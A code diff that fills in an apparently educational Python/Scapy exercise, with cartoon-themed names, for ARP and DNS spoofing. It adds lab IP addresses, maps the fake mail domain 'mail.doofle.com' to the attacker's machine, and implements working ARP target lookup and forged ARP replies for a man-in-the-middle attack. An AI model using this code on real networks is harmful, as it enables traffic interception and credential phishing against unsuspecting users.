@@ -5,9 +5,9 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "???"  # Enter the computer you attack's IP.
-SECRATERY_IP = "???"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.X"  # Enter the computer you attack's IP.
+SECRATERY_IP = "10.0.2.Y"  # Enter the attacker's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
 IFACE = "???"  # Enter the network interface you work on.
@@ -16,7 +16,7 @@ FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"???": FAKE_GMAIL_IP
+    b"mail.doofle.com": FAKE_GMAIL_IP
 }
 
 
@@ -49,16 +49,25 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        if self.target_mac is not None:
+            return self.target_mac
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_ip)
+        response = sr1(arp_request, timeout=5, verbose=False)
+        if response is not None:
+            self.target_mac = response[ARP].hwsrc
+            return self.target_mac
+        else:
+            raise Exception(f"Could not get target MAC address for IP {self.target_ip}")
+
 
     def spoof(self) -> None:
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
-        """        
-
-        # Your code here...
-
+        """
+        target_mac = self.get_target_mac()
+        arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        scapy.sendp(arp_response, iface=IFACE, verbose=False)
         self.spoof_count += 1
 
     def run(self) -> None:
